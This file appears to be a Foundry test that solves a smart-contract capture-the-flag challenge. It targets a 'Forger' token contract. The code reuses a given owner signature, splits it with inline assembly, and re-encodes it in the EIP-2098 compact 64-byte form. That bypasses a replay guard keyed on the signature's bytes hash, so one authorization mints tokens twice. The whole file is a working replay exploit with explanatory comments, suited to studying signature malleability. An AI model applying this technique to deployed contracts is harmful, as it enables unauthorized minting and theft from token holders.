//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Forger} from "../Forger.sol";

contract ForgerTest is Test {
    Forger forger;

    // Provided by the challenge:
    bytes signature =
        hex"f73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb1c";
    address receiver = 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e;
    uint256 amount = 100 ether;
    bytes32 salt = 0x044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d;
    uint256 deadline = type(uint256).max;

    function setUp() public {
        forger = new Forger();
    }

    function test_Challenge39_Passed() public {
        // --- Step 1: use the original 65-byte signature exactly as given. ---
        forger.createNewTokensFromOwnerSignature(signature, receiver, amount, salt, deadline);
        assertEq(forger.totalSupply(), 100 ether);

        // --- Step 2: derive the EIP-2098 compact 64-byte re-encoding of the
        // SAME signature. r stays identical; v (the last byte) gets folded
        // into s's top bit, since v = 0x1c = 28 -> recovery id = 1, and this
        // signature's s already has its top bit at 0 (it's low-s), so the
        // bit is free to use.
        //
        // NOTE: `signature` is a storage/memory `bytes`, not `calldata`, so
        // Solidity's slice syntax (signature[0:32]) is not available here --
        // it only works on calldata arrays. Split it with assembly instead,
        // the standard way ECDSA libraries parse r/s/v out of a signature.
        bytes memory sigMem = signature;
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(sigMem, 0x20))
            s := mload(add(sigMem, 0x40))
            v := byte(0, mload(add(sigMem, 0x60)))
        }

        uint8 recoveryId = v - 27; // 28 - 27 = 1
        // set the top bit of s to the recovery id -> forms `vs`
        bytes32 vs = bytes32(uint256(s) | (uint256(recoveryId) << 255));

        bytes memory compactSignature = bytes.concat(r, vs);
        assertEq(compactSignature.length, 64);

        // --- Step 3: replay the SAME authorization, just re-encoded.
        // signatureUsed[keccak256(signature)] never saw THIS byte string
        // before, so the replay guard does not fire, even though it is
        // cryptographically the exact same signed authorization. ---
        forger.createNewTokensFromOwnerSignature(compactSignature, receiver, amount, salt, deadline);

        // --- Step 4: confirm the exploit condition. ---
        console.log("total supply:", forger.totalSupply());
        assertGt(forger.totalSupply(), 100 ether);
    }
}
